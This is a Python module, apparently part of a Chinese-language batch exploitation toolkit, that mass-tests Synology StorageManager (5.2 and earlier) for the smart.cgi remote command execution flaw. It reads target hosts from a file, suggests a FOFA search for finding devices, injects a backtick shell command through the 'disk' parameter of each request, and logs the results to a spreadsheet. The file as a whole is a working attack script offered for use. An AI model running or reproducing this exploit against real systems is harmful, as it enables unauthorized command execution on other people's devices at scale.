

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork
from tools.WebShellLoder import WebShellLoder


def help():
    print('''
    fofa: "Synology"
        1. SSD Advisory – Synology StorageManager smart.cgi Remote Command Execution, 批量测试, Synology StorageManager <= 5.2
        2. 
    x. 退出
    ''')

def vul_sys(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
    }
    body = ''
    method = "GET"
    path = "/webman/modules/StorageManager/smart.cgi?action=apply&operation=quick&disk=/dev/sda`id%20>/tmp/LOL`"
    notes = ""
    return (url, method, headers, body, path, notes)

def run():
    OUTDIR = "result/Synology"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    # 获取资产目标
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    try:
        num = int(input("执行的指令: "))
    except ValueError:
        num = 99999

    if num == 1:
        data = []
        for url in li:
            item = vul_sys(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}Synology StorageManager smart.cgi 命令执行.xlsx")

    else:
        print('bye..')


